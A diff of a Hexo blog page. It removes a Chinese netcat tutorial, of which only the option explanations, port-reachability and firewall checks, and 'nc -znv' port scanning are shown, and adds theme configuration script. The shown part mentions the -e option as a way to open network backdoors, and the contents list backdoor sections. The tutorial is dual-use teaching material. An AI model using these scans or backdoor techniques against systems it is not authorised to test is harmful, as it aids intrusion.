@@ -1,564 +1,153 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>分类: 编程随想 - 胡小宁的博客</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="胡小宁的博客"><meta name="msapplication-TileImage" content="/images/本人.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="胡小宁的博客"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="胡小宁的博客"><meta property="og:url" content="http://1905060202.github.io/"><meta property="og:site_name" content="胡小宁的博客"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://1905060202.github.io/img/og_image.png"><meta property="article:author" content="胡小宁"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://1905060202.github.io"},"headline":"胡小宁的博客","image":["http://1905060202.github.io/img/og_image.png"],"author":{"@type":"Person","name":"胡小宁"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/%E6%9C%AC%E4%BA%BA.jpg" alt="胡小宁的博客" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于我</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分类</a></li><li class="is-active"><a href="#" aria-current="page">编程随想</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T15:54:54.000Z" title="2021/7/16 下午11:54:54">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:59:56.482Z" title="2021/7/16 下午11:59:56">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></span><span class="level-item">2 小时读完 (大约14293个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/netcat/">netcat</a></h1><div class="content"><h1 id="扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”"><a href="#扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”" class="headerlink" title="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”"></a>扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</h1><p><strong>文章目录</strong></p>
-<p>★引子<br>★netcat 是个啥玩意儿？<br>★netcat 能干啥？<br>★nc 命令行简介<br>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达<br>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口<br>★招数3：（渗透测试）用 nc 玩“端口扫描”<br>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）<br>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）<br>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问<br>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）<br>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）<br>★招数9：（系统管理）用 nc 传输文件<br>★招数10：（系统管理）用 nc 远程备份整个磁盘<br>★招数11：（入侵手法）用 nc 开启【被动】连接型后门<br>★招数12：（入侵手法）用 nc 开启【主动】连接型后门<br>★附录：netcat 的【其它变种】</p>
-<hr>
-<h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。<br>　　由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。<br>　　今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 ……<br>　　此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。</p>
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">---------------------<br>|<span class="hljs-string">      /\_/\        </span>|<br>|<span class="hljs-string">     / 0 0 \       </span>|<br>|<span class="hljs-string">    ====v====      </span>|<br>|<span class="hljs-string">     \  W  /       </span>|<br>|<span class="hljs-string">     </span>|<span class="hljs-string">     </span>|<span class="hljs-string">     _ </span>|<br>|<span class="hljs-string">     / ___ \    /  </span>|<br>|<span class="hljs-string">    / /   \ \  </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   (((-----)))-&#x27;   </span>|<br>|<span class="hljs-string">    /              </span>|<br>|<span class="hljs-string">   (      ___      </span>|<br>|<span class="hljs-string">    \__.=</span>|<span class="hljs-string">___E     </span>|<br>|<span class="hljs-string">           /       </span>|<br>---------------------<br></code></pre></td></tr></table></figure>
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>分类: 编程随想 | 胡小宁的博客</title><meta name="author" content="胡小宁"><meta name="copyright" content="胡小宁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="胡小宁的博客">
+<meta property="og:url" content="http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/index.html">
+<meta property="og:site_name" content="胡小宁的博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:author" content="胡小宁">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '分类: 编程随想',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-08-01 18:36:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<h2 id="★netcat-是个啥玩意儿？"><a href="#★netcat-是个啥玩意儿？" class="headerlink" title="★netcat 是个啥玩意儿？"></a>★netcat 是个啥玩意儿？</h2><p>　　netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【<strong>网络上的瑞士军刀</strong>】。<br>　　它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。</p>
-<h2 id="★netcat-能干啥？"><a href="#★netcat-能干啥？" class="headerlink" title="★netcat 能干啥？"></a>★netcat 能干啥？</h2><h3 id="◇概述"><a href="#◇概述" class="headerlink" title="◇概述"></a>◇概述</h3><p>　　简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（这里所说的“传输层协议”指的是 OSI 模型中的第4层，主要是 TCP ＆ UDP）。</p>
-<h3 id="◇nc-的变种"><a href="#◇nc-的变种" class="headerlink" title="◇nc 的变种"></a>◇nc 的变种</h3><p>　　由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。<br>　　由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：<strong>这篇教程的内容，主要基于 OpenBSD 社区的变种</strong>（也叫“OpenBSD netcat”或“netcat-openbsd”）<br>　　顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。<br>　　虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。<br>　　为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼【原始】的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。<br>　　另，<br>　　在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。</p>
-<h2 id="★nc-命令行简介"><a href="#★nc-命令行简介" class="headerlink" title="★nc 命令行简介"></a>★nc 命令行简介</h2><p>　　要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。</p>
-<h3 id="◇nc-命令行的常规形式"><a href="#◇nc-命令行的常规形式" class="headerlink" title="◇nc 命令行的常规形式"></a>◇nc 命令行的常规形式</h3><p>　　一般来说，nc 的命令行包括如下几个部分：</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> 命令选项 主机 端口<br></code></pre></td></tr></table></figure>
-<p><strong>命令选项</strong><br>　　这部分可能包含 0~N 个选项<br>　　（注：这部分最复杂，下一个小节单独聊）<br><strong>主机</strong><br>　　这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。<br><strong>端口</strong><br>　　这部分可能没有，可能是单个端口，可能是端口范围。<br>　　对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：<code>1-1024</code></p>
-<h3 id="◇何为“命令行选项”？"><a href="#◇何为“命令行选项”？" class="headerlink" title="◇何为“命令行选项”？"></a>◇何为“命令行选项”？</h3><p>　　简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。<br>　　你要使用的选项都放在 <code>nc</code> 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。<br>　　举例：<br>　　在下面这个例子中，分别用到了三个选项（<code>l、p、v</code>），其中 <code>12345</code> 是选项 <code>p</code> 所带的【选项值】。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">12345</span> -v<br></code></pre></td></tr></table></figure>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-<p>　　如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -h</span><br></code></pre></td></tr></table></figure>
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-<p>　　顺便说一下：在上述命令的输出中，如果第一行包含 <code>OpenBSD</code> 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。</p>
-<h3 id="◇【常用的】命令行选项"><a href="#◇【常用的】命令行选项" class="headerlink" title="◇【常用的】命令行选项"></a>◇【常用的】命令行选项</h3><p>　　由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。</p>
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>是否有“选项值”</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>h</td>
-<td>NO</td>
-<td>输出 nc 的帮助</td>
-</tr>
-<tr>
-<td>v</td>
-<td>NO</td>
-<td>在网络通讯时，显示详细的输出信息 注：建议新手多用该选项，出错时帮你诊断问题</td>
-</tr>
-<tr>
-<td>n</td>
-<td>NO</td>
-<td>对命令行中的“主机”，【不】进行域名解析 注：如果“主机”是“点分格式”的 IP 地址，需要用该选项； 如果“主机”是“域名”形式，【不能】用该选项</td>
-</tr>
-<tr>
-<td>p</td>
-<td>YES</td>
-<td>指定“端口号”</td>
-</tr>
-<tr>
-<td>l</td>
-<td>NO</td>
-<td>开启“监听模式”，nc 作为【服务端】 注：如不加该选项，nc 默认作为客户端</td>
-</tr>
-<tr>
-<td>u</td>
-<td>NO</td>
-<td>使用 UDP 协议 注：如不加该选项，默认是 TCP 协议</td>
-</tr>
-<tr>
-<td>w</td>
-<td>YES</td>
-<td>设置连接的超时间隔（N 秒）</td>
-</tr>
-<tr>
-<td>q</td>
-<td>YES</td>
-<td>让 nc 延时（N 秒）再退出</td>
-</tr>
-<tr>
-<td>z</td>
-<td>NO</td>
-<td>开启“zero-I/O 模式” 注：该选项仅用于“端口扫描”，后面会聊到</td>
-</tr>
-<tr>
-<td>k</td>
-<td>NO</td>
-<td>配合 <code>-l</code> 选项使用，可以重复接受客户端连接。 注：“原版 nc”的该选项用来开启“TCP keepalive” 这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
-</tr>
-<tr>
-<td>X</td>
-<td>YES</td>
-<td>指定代理的类型（具体用法，后面会聊到） 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
-</tr>
-<tr>
-<td>x</td>
-<td>YES</td>
-<td>以 <code>IP:port</code> 的格式指定代理的位置。 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
-</tr>
-<tr>
-<td>e</td>
-<td>YES</td>
-<td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】 注：通常用该选项开启一个网络后门 “OpenBSD 变种”基于安全考虑，已去掉该选项， 但还是能用间接的方式达到同样的效果 :)</td>
-</tr>
-</tbody></table>
-<p>　　汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。</p>
-<h3 id="◇命令行选项的【合写】形式"><a href="#◇命令行选项的【合写】形式" class="headerlink" title="◇命令行选项的【合写】形式"></a>◇命令行选项的【合写】形式</h3><p>　　有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。<br>　　还拿刚才俺举的例子，以下几种写法是【等价】滴。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">12345</span> -v<br><span class="hljs-attribute">nc</span> -l -v -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇如何强行终止-nc？"><a href="#◇如何强行终止-nc？" class="headerlink" title="◇如何强行终止 nc？"></a>◇如何强行终止 nc？</h3><p>　　一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。<br>　　对 nc，你同样可以这么干。</p>
-<h2 id="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"><a href="#★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达" class="headerlink" title="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"></a>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2><h3 id="◇使用场景"><a href="#◇使用场景" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　经常有这种需求，要判断某个主机的监听端口是否能连上。<br>　　导致监听端口【无法】，通常有两种原因：<br>其一，这个监听端口根本就【没开启】；<br>其二，监听端口虽然开启，但是被防火墙阻拦了。<br>　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启<br>　　但对于第2个原因，<code>netstat</code> 就用不上了。这时候就可以用 nc 来帮你搞定。</p>
-<h3 id="◇方法"><a href="#◇方法" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　用如下命令可以测试某个 IP 地址（<code>x.x.x.x</code>）上的某个监听端口（<code>xx</code>）是否开启。</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>
-
-<p>　　上述命令用到了如下几个选项：</p>
-<p><strong>选项 <code>-v</code></strong><br>　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br>　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）</p>
-<p><strong>选项 <code>-n</code></strong><br>　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br>　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p>
-<h3 id="◇补充说明：超时设置"><a href="#◇补充说明：超时设置" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　在测试链接的时候，如果你【没】使用 <code>-w</code> 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br>　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“<code>-w</code> 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv -w <span class="hljs-number">3</span> <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇补充说明：UDP"><a href="#◇补充说明：UDP" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 <code>-u</code> 选项。</p>
-<h2 id="★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口"><a href="#★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口"></a>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2><h3 id="◇使用场景-1"><a href="#◇使用场景-1" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br>　　现在换另一个场景：<br>　　假设你正在配置防火墙规则，禁止 TCP 的 <code>8080</code> 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br>　　更进一步说：如果当前【没有】任何软件开启 <code>8080</code> 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br>　　为了叙述方便，设想如下场景：<br>有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br>然后要判断“主机S”上的防火墙是否会拦截其它主机对 <code>8080</code> TCP 端口的连接。</p>
-<h3 id="◇方法-1"><a href="#◇方法-1" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>选项 <code>-l</code></strong><br>　　这个选项会让 nc 进入监听模式。</p>
-<p><strong>选项 <code>-p</code></strong><br>　　这个选项有“选项值”，也就是具体端口号。</p>
-<p>　　然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）</p>
-<h3 id="◇补充说明：是否省略“-p”？"><a href="#◇补充说明：是否省略“-p”？" class="headerlink" title="◇补充说明：是否省略“-p”？"></a>◇补充说明：是否省略“-p”？</h3><p>　　某些 nc 的变种，在开启监听模式时，可以省略“<code>-p</code>”，上述命令变为如下：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
-<p>　　但考虑到兼容性，（在后续章节中）俺总是写上 <code>-p</code> 选项。</p>
-<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br>　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br>　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 <code>-k</code> 选项。</p>
-<h3 id="◇补充说明：UDP-1"><a href="#◇补充说明：UDP-1" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 <code>-u</code> 选项。</p>
-<h2 id="★招数3：（渗透测试）用-nc-玩“端口扫描”"><a href="#★招数3：（渗透测试）用-nc-玩“端口扫描”" class="headerlink" title="★招数3：（渗透测试）用 nc 玩“端口扫描”"></a>★招数3：（渗透测试）用 nc 玩“端口扫描”</h2><h3 id="◇使用场景-2"><a href="#◇使用场景-2" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br>　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br>　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br>　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br>　　顺便说一下：<br>不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：<code>1</code> ~ <code>65535</code></p>
-<h3 id="◇方法-2"><a href="#◇方法-2" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　下面这个命令，用来扫描 IP 地址为 <code>x.x.x.x</code> 的主机，扫描的端口范围从 <code>1</code> 到 <code>1024</code></p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -znv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">1</span><span class="hljs-number">-1024</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>选项 <code>-z</code></strong><br>　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br><strong>选项 <code>-n</code></strong><br>　　（前面已聊过，参见“招数1”）<br><strong>选项 <code>-v</code></strong><br><code>-v</code> 选项前面也聊过，这里要特地强调一下。<br>　　对 nc 的其它用法，<code>-v</code> 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。</p>
-<h3 id="◇补充说明：优化输出"><a href="#◇补充说明：优化输出" class="headerlink" title="◇补充说明：优化输出"></a>◇补充说明：优化输出</h3><p>　　玩“端口扫描”的时候，“<code>-v</code> 选项”会把“成功/失败”的结果统统打印出来。<br>　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -znv x.x.x.x <span class="hljs-number">1</span>-<span class="hljs-number">1024</span>  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep succeeded<br></code></pre></td></tr></table></figure>
-<p>　　由于“<code>-v</code> 选项”产生的输出位于【stderr】，上述命令中的 <code>2&gt;&amp;1</code> 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br><code>grep</code> 命令用来进行【过滤】。对于 Windows 系统，默认【没有】<code>grep</code> 命令，需改用 <code>find</code> 命令过滤。</p>
-<h3 id="◇补充说明：超时设置-1"><a href="#◇补充说明：超时设置-1" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br>超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br>　　具体如何设置，参见“招数1”的“补充说明”。</p>
-<h3 id="◇补充说明：【并发】扫描"><a href="#◇补充说明：【并发】扫描" class="headerlink" title="◇补充说明：【并发】扫描"></a>◇补充说明：【并发】扫描</h3><p>　　如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br>　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。</p>
